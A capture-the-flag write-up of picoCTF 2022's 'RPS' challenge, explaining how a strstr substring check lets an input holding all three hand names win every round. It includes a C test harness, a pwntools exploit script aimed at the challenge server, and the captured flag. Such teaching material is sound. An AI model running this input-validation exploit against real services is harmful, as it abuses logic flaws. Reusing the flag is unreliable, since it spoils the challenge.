Title:  PicoCTF 2022:  RPS
Date: 2022-04-07 19:30
Category: PicoCTF
tags: CTF, picoCTF, write-up, binexp
summary: >
	Write up of the RPS binexp challenge.  Quite a cool little thing that teaches us to 
	check our expected inputs and test conditions
	
	
# RPS

RPS (Rock Paper Scissors) was a 200 point binexp challenge in picoCTF.
I Really quite enjoyed this one, not too tricksy, and a good reminder that we need to check
our inputs


The Program lets the user play a game of Rock Paper Scissors,  if you win 5 times in a row you will get the flag.

We could leave it to chance (brute force it),  but you chance of winning one game is $\frac{1}{3}$
Meaning to win 5 games in a row its something like this[^random]...

$$
{\frac{1}{3}}^5 == \frac{1}{243} == ~0.004
$$


Possible,  but pretty improbable.

## Looking at teh Codez

Lets dive into the code and see if there is anything to help us...

First up we have a couple of arrays to lookup the losing hand based on the the computers choice,

```
char* hands[3] = {"rock", "paper", "scissors"};
char* loses[3] = {"paper", "scissors", "rock"};
int wins = 0;
```


We get the Players choice and check if they win here

```
printf("Please make your selection (rock/paper/scissors):\n");
r = tgetinput(player_turn, 100);

// Timeout on user input
if(r == -3)
{
	printf("Goodbye!\n");
    exit(0);
}

int computer_turn = rand() % 3;
printf("You played: %s\n", player_turn);
printf("The computer played: %s\n", hands[computer_turn]);

if (strstr(player_turn, loses[computer_turn])) {
	puts("You win! Play again?");
	return true;
} else {
	puts("Seems like you didn't win this time. Play again?");
	return false;
}
```

# POC

## Picking out the issue.

No overflows or fun things like that to play with,  so we are going to have to nobble that comparison function.

What happens here:

  1. Player supplies input
  1. Computer Picks a random value between 0-2, 
    - uses this as the index to the ```hands``` array to make its choice
    - The Losing condition is also calculated using the ```loses``` array. 
  1. The ```strstr``` function is used to look for the **lose condition** in the players input. If we **have a match** then the player must have input the thing that beats the computer right.....

## strstr()

The [Strstr](https://www.tutorialspoint.com/c_standard_library/c_function_strstr.htm)  function will return:

   - the first instance of a string in the target string
   - null otherwise.
   
So we need to find a way to get his to return True each time.

The interesting (and exploitable) thing here is how the strings get compared. We don't look for an absolute match, but rather check to see if the players input *contains* the lose condition[^reasoning],   this is very different from checking if the players input exactly matches the lose condition.

This means that the player will win if the lose condition is a **substring** of the players input.

We can check our theory is correct with the following test harness.

```
#include <stdio.h>
#include <string.h>


int main () {
    //Playrs Input
   const char haystack[20] = "rockpaperscissors";
   
   //Lose Condition
   const char needle[10] = "rock";
   char *ret;

   ret = strstr(haystack, needle);

   printf("Player input is %s\n", needle);
   printf("The substring is: %s\n", ret);
   
   return(0);
}
```

Trying our different inputs we get a match on all possible conditions:

```
Player input is rock
The substring is: rockpaperscissors

Player input is rock
The substring is: rockpaperscissors

Player input is rock
The substring is: rockpaperscissors
```


# The Exploit

Again lets make use of pwntools to write our exploit

```
from pwn import *

p = process("./a.out")
#p = remote("saturn.picoctf.net", 56981)

def playRound():
    """
    Play a single round
    """
    
    out = p.recvuntil("program") #Get initial data
    log.debug("Data was %s", out)

    #we need to send 1 to play the game
    p.sendline(b"1")

    out = p.recvuntil(":")
    log.debug("Data was %s", out)

    p.sendline(b"rock paper scissors")

    log.debug("Data was Sent")
    out = p.recvuntil("Play again")
    log.info("Outcome was %s", out)
    out = p.recvuntil("Type") #Complex output
    log.info("%s", out)

for x in range(6):
    playRound()
        
```


Running that gives us the flag...

```
[*] Flag is: b'?\nType'
[*] Flag is: b'?\nType'
[*] Flag is: b'?\nType'
[*] Flag is: b'?\nType'
[*] Flag is: b"?\nCongrats, here's the flag!\r\npicoCTF{50M3_3X7R3M3_1UCK_C85AF58A}\r\nType"
[*] Flag is: b"?\nCongrats, here's the flag!\r\npicoCTF{50M3_3X7R3M3_1UCK_C85AF58A}\r\nType"
[*] Stopped process './a.out' (pid 283103)
```





[^random]: While a computer is pseudo-random,  its still more random than a human,  odds are different with people playing as they have trends.
[^reasoning]:  It seems a reasonably sensible mistake to make.  Perhaps the dev was worried about newlines or stuff from the network stopping a proper string compare working
